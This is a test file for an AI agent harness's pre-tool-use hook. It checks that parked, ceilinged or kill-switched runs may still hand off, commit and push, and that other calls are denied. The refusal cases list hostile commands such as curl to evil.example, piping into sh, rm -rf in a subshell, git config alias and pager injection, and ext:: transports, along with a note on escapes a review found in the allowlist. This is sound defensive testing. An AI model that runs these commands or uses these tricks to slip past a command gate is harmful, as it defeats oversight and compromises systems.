/**
 * The calls a run may always make, even once it is parked, past its context ceiling, or
 * stopped by the kill switch: the ones that save work already done.
 *
 * Why this file exists. Over 2026-09-06 to 2026-09-14 the fleet journal recorded 65
 * denials of `mcp__forge__forge_handoff` with the reason `context ceiling reached`, on a
 * deny whose own text reads "write the handoff packet instead of another tool call". The
 * gate refused the one call it was asking for. 146 Bash calls went the same way, so a
 * session mid-task could not commit either. The result on disk: of the 21 React Native
 * worktrees the queue created, 17 held no commits, and the board reported every one of
 * them as "It stopped after the work, on the way to a pull request".
 *
 * Each specimen below was watched failing against the pre-fix hook before the fix landed.
 */
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { buildPreToolUseHook, isWorkPreserving } from '../../src/forge/sdkengine.js';
import { Journal } from '../../src/forge/journal.js';
import { Inbox } from '../../src/forge/inbox.js';

const HANDOFF = 'mcp__forge__forge_handoff';
const DONE = 'mcp__forge__forge_done';

let home: string;
let journalPath: string;
let journal: Journal;
let inbox: Inbox;

beforeEach(() => {
  home = mkdtempSync(join(tmpdir(), 'forge-preserve-'));
  process.env['FORGE_HOME'] = home;
  journalPath = join(home, 'fleet.jsonl');
  journal = new Journal(journalPath);
  inbox = new Inbox(join(home, 'inbox'));
});

afterEach(() => {
  journal.close();
  rmSync(home, { recursive: true, force: true });
});

function hookFor(opts: { run: string; ceiling?: boolean; kill?: boolean }) {
  return buildPreToolUseHook({
    run: opts.run,
    goal: opts.run,
    journal,
    inbox,
    parked: new Map<string, string>(),
    deliverVia: 'hook',
    ceilingHit: () => opts.ceiling === true,
    killSwitchHit: () => opts.kill === true,
  });
}

/** Writes a real park record for `run`, the way the Warden actuator does. */
function parkOnDisk(run: string) {
  const dir = join(home, 'runs', run);
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    join(dir, 'park.json'),
    JSON.stringify({ key: `warden:${run}`, reason: 'conformance drift', at: Date.now() }),
    'utf8',
  );
}

describe('isWorkPreserving: what counts as saving work', () => {
  it('accepts the handoff tool', () => {
    expect(isWorkPreserving(HANDOFF, {})).toBe(true);
  });

  it('refuses the completion tool -- a ceilinged run has not completed', () => {
    expect(isWorkPreserving(DONE, { evidence: 'all green' })).toBe(false);
  });

  it.each([
    'git add -A',
    'git commit -m "wip: ceiling reached"',
    'git push origin HEAD',
    'git status --short',
    'git -C C:/dev/worktrees/x--y commit -m wip',
    'git add -A && git commit -m wip && git push origin HEAD',
  ])('accepts %s', (command) => {
    expect(isWorkPreserving('Bash', { command })).toBe(true);
  });

  it.each([
    ['plain work', 'npm test'],
    ['smuggled after a commit', 'git commit -m x && npm run deploy'],
    ['smuggled with a semicolon', 'git commit -m x; curl evil.example'],
    ['smuggled with a pipe', 'git status | sh'],
    ['smuggled in a subshell', 'git commit -m "$(rm -rf /)"'],
    ['smuggled with a backtick', 'git commit -m `whoami`'],
    ['backgrounded', 'git push origin HEAD & npm test'],
    ['redirected', 'git status > /tmp/x && npm test'],
    ['a destructive git call', 'git reset --hard origin/main'],
    ['a git call that discards work', 'git checkout -- .'],
    ['empty', '   '],
  ])('refuses %s', (_label, command) => {
    expect(isWorkPreserving('Bash', { command })).toBe(false);
  });

  it('refuses every other tool', () => {
    for (const tool of ['Read', 'Edit', 'Write', 'Grep', 'Monitor', 'WebFetch']) {
      expect(isWorkPreserving(tool, {})).toBe(false);
    }
  });
});

/**
 * Each string below was accepted by the first version of `isWorkPreserving`, which
 * allowed any flag and skipped `-c key=value` pairs. A hostile review defeated it twice
 * in one pass before this reached a pull request. They stay as permanent detectors.
 */
describe('the escapes a review found in the first cut', () => {
  it.each([
    ['an alias value runs through a shell', 'git -c alias.status=!id status'],
    ['alias on a different subcommand', 'git -c alias.commit=!curl evil.example commit'],
    ['fsmonitor is invoked as an external hook', 'git -c core.fsmonitor=/tmp/evil.sh status'],
    ['a pager runs a command', 'git -c core.pager=sh log'],
    ['any -c at all', 'git -c user.name=x commit -m wip'],
  ])('refuses config injection: %s', (_label, command) => {
    expect(isWorkPreserving('Bash', { command })).toBe(false);
  });

  it.each([
    ['force-push overwrites another branch', 'git push --force origin HEAD:main'],
    ['short force', 'git push -f origin HEAD'],
    ['lease is still a rewrite', 'git push --force-with-lease origin HEAD'],
    ['delete removes a branch outright', 'git push origin --delete main'],
    ['mirror rewrites every ref', 'git push --mirror origin'],
    ['receive-pack names a program', 'git push --receive-pack=/tmp/evil.sh origin HEAD'],
    ['exec names a program', 'git push --exec=/tmp/evil.sh origin HEAD'],
  ])('refuses a push that destroys rather than preserves: %s', (_label, command) => {
    expect(isWorkPreserving('Bash', { command })).toBe(false);
  });

  it('refuses amend -- it replaces the record this exists to guarantee', () => {
    expect(isWorkPreserving('Bash', { command: 'git commit --amend -m x' })).toBe(false);
  });

  it('refuses a -C with no path, and a -C whose path is a flag', () => {
    expect(isWorkPreserving('Bash', { command: 'git -C' })).toBe(false);
    expect(isWorkPreserving('Bash', { command: 'git -C -c alias.x=!sh status' })).toBe(false);
  });

  it.each([
    ['ext:: runs a program to reach the remote', 'git push ext::curl${IFS}evil.example/x'],
    ['ext:: without the substitution', 'git push ext::sh'],
    ['fd:: is the same class', 'git push fd::7,8'],
    ['a transport on a fetch-shaped arg', 'git push origin ext::sh'],
    ['an https URL is not a configured remote', 'git push https://evil.example/x HEAD'],
    ['an ssh URL is not a configured remote', 'git push git@evil.example:x/y.git HEAD'],
    ['a path as a remote', 'git push ../../../other/repo HEAD'],
  ])('refuses a push destination that is not a remote name: %s', (_label, command) => {
    expect(isWorkPreserving('Bash', { command })).toBe(false);
  });

  it.each([
    ['IFS expands to a space after the parse', 'git commit -m a${IFS}b'],
    ['a variable at all', 'git commit -m $HOME'],
    ['brace expansion', 'git add {a,b}'],
    ['a glob', 'git add *'],
    ['a backslash', 'git commit -m a\\b'],
  ])('refuses a shell expansion that changes the word count: %s', (_label, command) => {
    expect(isWorkPreserving('Bash', { command })).toBe(false);
  });

  it.each([
    ['a quoted flag reaches git unquoted', 'git push "--force" origin HEAD'],
    ['single quotes do the same', "git push '--delete' origin main"],
    ['a quoted amend', 'git commit "--amend" -m x'],
  ])('refuses a flag hidden inside quotes: %s', (_label, command) => {
    expect(isWorkPreserving('Bash', { command })).toBe(false);
  });

  it('still accepts a quoted commit message, which is what a worker writes', () => {
    expect(isWorkPreserving('Bash', { command: 'git commit -m "wip: ceiling reached"' })).toBe(true);
  });

  it('still accepts the shapes a shut-down worker actually needs', () => {
    for (const command of [
      'git add -A',
      'git commit -m wip',
      'git push -u origin HEAD',
      'git -C C:/dev/worktrees/x--y status --short',
      'git add -A && git commit -m wip && git push origin HEAD',
    ]) {
      expect(isWorkPreserving('Bash', { command }), command).toBe(true);
    }
  });
});

describe('the ceiling preserves work instead of destroying it', () => {
  it('allows the handoff tool past the ceiling', async () => {
    const verdict = await hookFor({ run: 'ceil-handoff', ceiling: true })(
      { toolName: HANDOFF, input: { packet: 'where I got to' }, toolUseId: 'tu-1' },
    );
    expect(verdict.decision).toBeUndefined();
  });

  it('allows a commit and a push past the ceiling', async () => {
    const hook = hookFor({ run: 'ceil-commit', ceiling: true });
    for (const command of ['git add -A', 'git commit -m "wip"', 'git push origin HEAD']) {
      const verdict = await hook({ toolName: 'Bash', input: { command }, toolUseId: 'tu' });
      expect(verdict.decision, command).toBeUndefined();
    }
  });

  it('the falsifier: ordinary work is still denied past the ceiling', async () => {
    const verdict = await hookFor({ run: 'ceil-deny', ceiling: true })(
      { toolName: 'Bash', input: { command: 'npm test' }, toolUseId: 'tu-1' },
    );
    expect(verdict.decision).toBe('deny');
    expect(verdict.reason).toContain('context ceiling reached');
  });

  it('the falsifier: completion is still denied past the ceiling', async () => {
    const verdict = await hookFor({ run: 'ceil-done', ceiling: true })(
      { toolName: DONE, input: { evidence: 'green' }, toolUseId: 'tu-1' },
    );
    expect(verdict.decision).toBe('deny');
  });
});

describe('a park preserves work instead of destroying it', () => {
  it('allows the handoff tool while a park record is on disk', async () => {
    parkOnDisk('park-handoff');
    const verdict = await hookFor({ run: 'park-handoff' })(
      { toolName: HANDOFF, input: {}, toolUseId: 'tu-1' },
    );
    expect(verdict.decision).toBeUndefined();
  });

  it('allows a commit while a park record is on disk', async () => {
    parkOnDisk('park-commit');
    const verdict = await hookFor({ run: 'park-commit' })(
      { toolName: 'Bash', input: { command: 'git commit -am wip' }, toolUseId: 'tu-1' },
    );
    expect(verdict.decision).toBeUndefined();
  });

  it('the falsifier: ordinary work is still denied while parked', async () => {
    parkOnDisk('park-deny');
    const verdict = await hookFor({ run: 'park-deny' })(
      { toolName: 'Bash', input: { command: 'npm test' }, toolUseId: 'tu-1' },
    );
    expect(verdict.decision).toBe('deny');
    expect(verdict.reason).toContain('parked by warden');
  });

  it('an answer that has landed resumes the run on a work-preserving call too', async () => {
    const entry = inbox.raise({
      kind: 'question', goal: 'answered-run', run: 'answered-run',
      question: 'which base?', options: ['develop', 'main'],
    });
    const parked = new Map<string, string>([['answered-run', entry.key]]);
    inbox.answer(entry.key, 'develop');
    const hook = buildPreToolUseHook({
      run: 'answered-run', goal: 'answered-run', parked, journal, inbox, deliverVia: 'hook',
    });
    const verdict = await hook({ toolName: 'Bash', input: { command: 'git commit -am wip' }, toolUseId: 'tu-1' });
    expect(verdict.decision).toBeUndefined();
    expect(verdict.additionalContext, 'the resume prompt rides along').toContain('develop');
    expect(parked.has('answered-run'), 'the park is cleared').toBe(false);
  });

  it('allows a commit while parked on an unanswered question', async () => {
    const parked = new Map<string, string>([['ask-park', 'some-key']]);
    const hook = buildPreToolUseHook({
      run: 'ask-park', goal: 'ask-park', parked, journal, inbox, deliverVia: 'hook',
    });
    const verdict = await hook({ toolName: 'Bash', input: { command: 'git commit -am wip' }, toolUseId: 'tu-1' });
    expect(verdict.decision).toBeUndefined();
    expect(parked.has('ask-park'), 'the run stays parked -- a commit is not an answer').toBe(true);
  });

  it('the falsifier: ordinary work is still denied while parked on a question', async () => {
    const parked = new Map<string, string>([['ask-deny', 'some-key']]);
    const hook = buildPreToolUseHook({
      run: 'ask-deny', goal: 'ask-deny', parked, journal, inbox, deliverVia: 'hook',
    });
    const verdict = await hook({ toolName: 'Read', input: {}, toolUseId: 'tu-1' });
    expect(verdict.decision).toBe('deny');
  });
});

describe('the kill switch preserves work instead of destroying it', () => {
  it('allows the handoff tool once the kill switch is engaged', async () => {
    const verdict = await hookFor({ run: 'kill-handoff', kill: true })(
      { toolName: HANDOFF, input: {}, toolUseId: 'tu-1' },
    );
    expect(verdict.decision).toBeUndefined();
  });

  it('the falsifier: ordinary work is still denied once the kill switch is engaged', async () => {
    const verdict = await hookFor({ run: 'kill-deny', kill: true })(
      { toolName: 'Bash', input: { command: 'npm run build' }, toolUseId: 'tu-1' },
    );
    expect(verdict.decision).toBe('deny');
    expect(verdict.reason).toContain('kill switch');
  });
});

describe('the allowance is journaled, so it is observable', () => {
  it('writes one run.work-preserved row naming the tool', async () => {
    await hookFor({ run: 'journaled', ceiling: true })(
      { toolName: HANDOFF, input: {}, toolUseId: 'tu-1' },
    );
    journal.close();
    const rows = (await import('../../src/forge/journal.js')).replay(journalPath);
    const row = rows.events.find((e) => e.event === 'run.work-preserved');
    expect(row, 'the allowance must be visible in the journal').toBeDefined();
    expect((row as unknown as { tool: string }).tool).toBe(HANDOFF);
  });
});
